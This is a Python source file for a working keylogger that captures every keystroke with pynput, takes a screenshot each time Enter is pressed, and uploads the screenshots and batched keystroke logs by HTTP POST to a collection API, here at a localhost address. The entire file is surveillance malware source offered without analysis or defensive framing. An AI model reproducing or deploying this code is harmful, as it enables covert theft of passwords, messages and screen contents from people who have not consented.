from os import write
import pynput
import pyautogui
import secrets
import requests
import time
from datetime import datetime
from pynput.keyboard import Listener

s = requests.Session()

write_this = ''

def log_keystroke(key):
    
    global write_this

    key = str(key).replace("'", "")
    
    special_keys =  {
        'Key.ctrl' : ' <Ctrl> ',
        'Key.ctrl_l' : ' <Left_Ctrl> ',
        'key.ctrl_r' : ' <Right_Ctrl> ',
        'Key.space' : ' <Space> ',
        'Key.shift' : ' <Shift> ',
        'Key.shift_l' : ' <Left_Shift> ',
        'Key.shift_r' : ' <Right_Shift> ',
        'Key.backspace' : ' <Backspace> ',
        'Key.alt_l' : ' <Alt_L> ',
        'Key.alt_r' : ' <Alt_R> ',
        'Key.enter' : ' <Enter> ',
        'Key.up' : ' <Arrow_Up> ',
        'Key.right' : ' <Arrow_Right> ',
        'Key.left' : ' <Arrow_Left> ',
        'Key.down' : ' <Arrow_Down> ',
        'Key.page_up' : ' <Page_Up> ',
        'Key.page_down' : ' <Page_Down> ',
        'Key.tab' : ' <Tab> ',
        'Key.scroll_lock' : ' <Scrolllock> ',
        'Key.caps_lock' : ' <Capslock> ',
        'Key.esc' : ' <ESC> ',
        'Key.cmd' : ' <OS_key> ',
        'Key.cmd_l' : ' <OS_key> ',
        'Key.cmd_r' : ' <OS_key> ',
        'Key.delete' : ' <Delete> ',
        'Key.f1' : ' <F1> ',
        'Key.f2' : ' <F2> ',
        'Key.f3' : ' <F3> ',
        'Key.f4' : ' <F4> ',
        'Key.f5' : ' <F5> ',
        'Key.f6' : ' <F6> ',
        'Key.f7' : ' <F7> ',
        'Key.f8' : ' <F8> ',
        'Key.f9' : ' <F9> ',
        'Key.f10' : ' <F10> ',
        'Key.f11' : ' <F11> ',
        'Key.f12' : ' <F12> ',
        'Key.home' : ' <Home> ',
        'Key.printscreen' : ' <Printscreen> ',
        'Key.end' : ' <End> ',
        'Key.insert': ' <Insert> ',
        'Key.pause' : ' <Pause> ',
        'Key.media_next': ' <Media_next> ',
        'Key.media_play_pause': ' <Media_play/pause> ',
        'Key.media_previous' : ' <Media_previous> ',
        'Key.media_volume_mute' : ' <Media_mute> ',
        'Key.media_volume_up' : ' <Media_volume_up> ',
        'Key.media_volume_down' : ' <Media_volume_down> '
    }

    if key == 'Key.esc':
        return False
    elif special_keys.get(key) != None:
        write_this += special_keys[key]
    else:
        write_this += key

    if key == "Key.enter":
        take_screenshot = pyautogui.screenshot()
        file_name = datetime.now().strftime("%d-%b-%Y %H.%M.%S") + '.jpg'
        take_screenshot.save(f'screenshot\\{file_name}')

        files = {'upload_file': open('screenshot\\' + file_name, 'rb')}
        r = s.post("http://127.0.0.1:5000/api/v1/image", files=files)

    print(len(write_this))
    if len(write_this) >= 100:
        print('kirim')
        if write_this != '': 
            with open("log.txt", 'a') as f:
                write_this = datetime.now().strftime("%d-%b-%Y %H:%M:%S") + " >> " + write_this + "\n"
                f.write(f"{write_this}")
                files = {'upload_file': open('log.txt','rb')}
                print(files)
                r = s.post("http://127.0.0.1:5000/api/v1/log", files=files)
                write_this = ''
                start_time = time.time()


with Listener(on_press=log_keystroke) as l:

    l.join()
